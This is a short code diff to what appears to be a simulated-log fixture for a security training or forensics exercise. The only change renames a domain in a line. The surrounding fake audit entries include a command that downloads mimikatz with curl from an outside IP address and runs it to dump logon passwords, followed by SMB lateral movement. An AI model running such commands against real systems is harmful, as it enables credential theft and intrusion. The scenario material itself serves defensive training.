@@ -27,7 +27,7 @@ export default {
       "type=USER_CMD msg=audit(2026-02-12T00:03:52): pid=2042 uid=500 auid=500 ses=412 user='Administrator' cmd='/usr/bin/passwd svc_support'",
       "type=USER_CMD msg=audit(2026-02-12T00:04:05): pid=2043 uid=500 auid=500 ses=412 user='Administrator' cmd='/bin/systemctl enable svc_scan.timer'",
       "type=USER_CMD msg=audit(2026-02-12T00:04:22): pid=2044 uid=500 auid=500 ses=412 user='svc_support' cmd='/bin/bash -c curl -s http://45.155.205.33:8080/mimikatz.exe -o /tmp/k.exe && chmod +x /tmp/k.exe && /tmp/k.exe sekurlsa::logonpasswords'",
-      "type=USER_CMD msg=audit(2026-02-12T00:06:50): pid=2050 uid=2005 auid=2005 ses=415 user='svc_support' cmd='smbclient //10.0.4.22/share -U acme\\\\svc_backup'",
+      "type=USER_CMD msg=audit(2026-02-12T00:06:50): pid=2050 uid=2005 auid=2005 ses=415 user='svc_support' cmd='smbclient //10.0.4.22/share -U cibercorp\\\\svc_backup'",
     ].join("\n"),
 
     "/var/log/systemd/timers.log": [
